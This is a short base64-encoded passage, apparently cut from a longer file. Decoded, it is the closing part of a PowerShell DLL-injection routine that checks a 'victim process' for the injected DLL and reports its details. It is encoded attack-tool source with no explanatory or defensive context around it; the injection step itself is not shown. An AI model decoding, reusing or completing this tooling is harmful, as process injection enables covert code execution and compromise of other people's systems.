NwbGl0LVBhdGggJERsbCAtTGVhZgogICAgJERsbEluZm8gPSAoR2V0LVByb2Nlc3MgLUlkICRQcm9jZXNzSUQpLk1vZHVsZXMgfCA/IHsgJF8uRmlsZU5hbWUuQ29udGFpbnMoJEZpbGVOYW1lKSB9IHwgZmwgKiB8IE91dC1TdHJpbmcKCiAgICBpZiAoISREbGxJbmZvKQogICAgewogICAgICAgIFRocm93ICJEbGwgZGlkIGRvdCBpbmplY3QgcHJvcGVybHkgaW50byB0aGUgdmljdGltIHByb2Nlc3MuIgogICAgfQoKICAgIFdyaXRlLVZlcmJvc2UgIkluamVjdGVkIERMTCBpbmZvcm1hdGlvbjokKCREbGxJbmZvKSIKfQo=
